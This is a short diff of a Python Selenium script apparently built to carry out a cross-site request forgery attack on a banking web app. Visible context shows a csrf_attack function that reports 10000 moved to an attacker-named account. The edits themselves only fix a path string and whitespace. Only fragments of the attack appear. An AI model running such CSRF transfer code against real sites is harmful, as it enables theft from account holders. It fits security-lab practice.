@@ -17,7 +17,8 @@ from utility import get_cookie_from_driver
 import re
 import json
 
-PATH = "C:\Program Files (x86)\chromedriver.exe"
+PATH = r"C:\Program Files (x86)\chromedriver.exe"
+
 
 def init():
     print("[+] Initializing")
@@ -82,7 +83,7 @@ def csrf_attack():
         if 'Amount on your account: <b> -' in response.text:
             print(f'[+] Stage 3 - Csrf Attack Success: Amount Of 10000 Was Transferred to this account: {bank_account}')
 
-
     driver.quit()
+
 
 csrf_attack()
